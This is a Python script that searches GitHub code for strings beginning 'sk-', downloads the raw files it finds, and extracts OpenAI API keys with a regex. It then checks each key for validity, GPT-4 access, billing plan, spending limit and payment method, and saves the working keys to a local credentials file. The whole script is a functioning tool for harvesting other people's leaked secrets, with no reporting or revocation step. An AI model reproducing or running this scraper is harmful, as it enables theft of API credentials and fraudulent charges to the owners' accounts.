from openai import OpenAI
import requests
import json
from dotenv import load_dotenv
import os
from os.path import join, dirname
import re
import time

# load .env file
load_dotenv(verbose=True)
dotenv_path = join(dirname(__file__), '.env')
load_dotenv(dotenv_path)

CRED_LIST_FILEPATH = os.environ.get("CRED_LIST_FILEPATH")
GITHUB_API_TOKEN = os.environ.get("GITHUB_API_TOKEN")

# var
page = 1

# validation
if CRED_LIST_FILEPATH is None:
    raise ValueError("CRED_LIST_FILEPATH is not set")
if GITHUB_API_TOKEN is None:
    raise ValueError("GITHUB_API_TOKEN is not set")

print(f"Credentials file path: {CRED_LIST_FILEPATH}")
print(f"Github API token: {GITHUB_API_TOKEN}")

# if cred_list_filepath is not there, then create one
if not os.path.exists(CRED_LIST_FILEPATH):
    data = {
        "credentials": []
    }
    with open(CRED_LIST_FILEPATH, 'w') as f:
        json.dump(data, f)

def search_github_code_urls(cur_page) -> list[str]:
    query = 'sk-'
    headers = {'Authorization': f'token {GITHUB_API_TOKEN}'}
    url = 'https://api.github.com/search/code'
    params = {'q': query, 'page': cur_page}
    response = requests.get(url, headers=headers, params=params)
    if response.status_code == 200:
        return map(lambda item: item['html_url'], response.json()['items'])
    else:
        print(f"Error: {response.status_code}")
        return None

def extract_credentials(html: str) -> list[str]:
    # New regex pattern
    pattern = r'sk-[a-zA-Z0-9.-_]+[`"\'\n]'
    return map(lambda item: item[:-1], re.findall(pattern, html))

def validate_key(key):
    validation_url = "https://api.openai.com/v1/models/gpt-4"
    subscription_url = "https://api.openai.com/v1/dashboard/billing/subscription"
    headers = {
        "Authorization": f"Bearer {key}"
    }
    r = requests.get(validation_url, headers=headers)
    if r.status_code == 401:
        return False  # token revoked or invalid
    gpt_4 = r.status_code != 404
    subscription = requests.get(subscription_url, headers=headers).json()
    expiration = subscription["access_until"]
    if expiration < time.time():
        return False  # token expired
    hard_limit = subscription["hard_limit_usd"] or subscription["system_hard_limit_usd"]
    plan_id = subscription["plan"]["id"]
    payment_method = subscription["has_payment_method"]
    return {
        "key": key,
        "gpt4_allowed": gpt_4,
        "plan": plan_id,
        "limit": hard_limit,
        "payment_method": payment_method,
        "expiration": expiration
    }

while True:
    html_urls = search_github_code_urls(page)
    if html_urls is None:
        print("No more results")
        break
    for url in html_urls:
        get_raw_url = url.replace('github.com', 'raw.githubusercontent.com').replace('/blob', '')
        cur_html = requests.get(get_raw_url).text
        credentials = extract_credentials(cur_html)
        for cred in credentials:
            print(f"found: {cred}")
            print(f"checking if valid...")
            validation_result = validate_key(cred)
            if isinstance(validation_result, dict):
                print("*" * 30)
                print(f"valid!!!")
                print("*" * 30)
                with open(CRED_LIST_FILEPATH, 'r') as f:
                    data = json.load(f)
                    if cred not in data['credentials']:
                        data['credentials'].append(cred)
                        with open(CRED_LIST_FILEPATH, 'w') as f:
                            json.dump(data, f)
            else:
                print(f"invalid...")
    page += 1
